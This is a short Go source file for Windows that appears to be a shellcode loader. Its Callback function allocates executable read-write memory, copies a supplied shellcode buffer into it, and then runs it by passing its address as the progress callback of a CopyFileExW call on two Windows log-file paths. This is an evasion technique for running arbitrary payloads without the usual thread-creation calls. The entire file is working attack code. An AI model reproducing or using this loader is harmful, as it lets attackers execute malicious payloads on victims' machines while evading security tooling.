package TT

import (
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT               = 0x1000
	MEM_RESERVE              = 0x2000
	PAGE_EXECUTE_READWRITE   = 0x40
	COPY_FILE_FAIL_IF_EXISTS = 0x00000001
	FALSE                    = 0
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	DeleteFileW   = kernel32.MustFindProc("DeleteFileW")
	CopyFileExW   = kernel32.MustFindProc("CopyFileExW")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	p1, _ := syscall.UTF16PtrFromString("C:\\Windows\\Temp\\backup.log\\0")
	p2, _ := syscall.UTF16PtrFromString("C:\\Windows\\DirectX.log")
	p3, _ := syscall.UTF16PtrFromString("C:\\Windows\\Temp\\backup.log")

	DeleteFileW.Call(uintptr(unsafe.Pointer(p1)))
	CopyFileExW.Call(
		uintptr(unsafe.Pointer(p2)),
		uintptr(unsafe.Pointer(p3)),
		addr,
		0,
		FALSE, COPY_FILE_FAIL_IF_EXISTS)
}
